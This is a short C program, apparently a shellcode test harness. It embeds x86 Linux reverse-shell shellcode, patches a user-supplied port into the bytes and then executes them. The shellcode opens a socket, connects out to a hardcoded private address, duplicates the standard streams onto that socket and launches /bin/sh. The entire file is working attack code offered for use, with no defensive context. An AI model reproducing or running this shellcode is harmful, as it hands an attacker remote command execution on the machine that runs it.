#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x6a\x66\x58\x6a\x01\x5b\x31\xc9\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x6a\x03\x5b\x68\xc0\xa8\x11\x80\x66\x68"
"\x22\xb8" //port number
"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x6a\x02\x59\x89\xf3\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\x6a\x0b\x58\xcd\x80";

int main(int argc, char *argv[])
{
	//Get port number to use
	if (argc != 2) {
		printf("Usage: shellcode2 <port_number>\n");
		return -1;
	}

	//code[32] and code[33] controls the port number
	unsigned short port = atoi(argv[1]);
	code[33] = ((unsigned char *)(&port))[0];
	code[32] = ((unsigned char *)(&port))[1];

	//execute shellcode
	printf("Shellcode Length:  %d\nExecuting Reverse Shell to port %d\n", strlen(code), port);
	int (*ret)() = (int(*)())code;
	ret();
}

